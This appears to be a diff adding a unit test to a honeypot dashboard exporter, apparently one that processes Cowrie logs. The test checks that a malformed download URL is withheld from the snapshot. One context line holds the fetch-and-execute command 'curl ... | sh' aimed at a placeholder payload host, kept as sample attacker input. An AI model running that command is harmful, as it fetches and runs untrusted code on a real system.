@@ -133,6 +133,23 @@ class DashboardExportTests(unittest.TestCase):
         self.assertEqual(cleaned, "curl https://payload.example.invalid/dropper | sh")
         self.assertGreaterEqual(redactions, 1)
 
+    def test_malformed_download_url_is_withheld_without_blocking_snapshot(self):
+        events, invalid = export_dashboard.load_events(FIXTURE)
+        download = next(event for event in events if event.get("eventid") == "cowrie.session.file_download")
+        download["url"] = "payload.example.invalid/dropper"
+        snapshot = export_dashboard.build_snapshot(
+            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
+        )
+        self.assertIsNone(snapshot["artifacts"][0]["url"])
+        self.assertIn(
+            "Malformed transfer reference withheld",
+            next(item for item in snapshot["mitre"] if item["id"] == "T1105")["evidence"],
+        )
+        self.assertIn(
+            "Malformed transfer reference withheld",
+            [item["detail"] for item in snapshot["recent"]],
+        )
+
 
 if __name__ == "__main__":
     unittest.main()
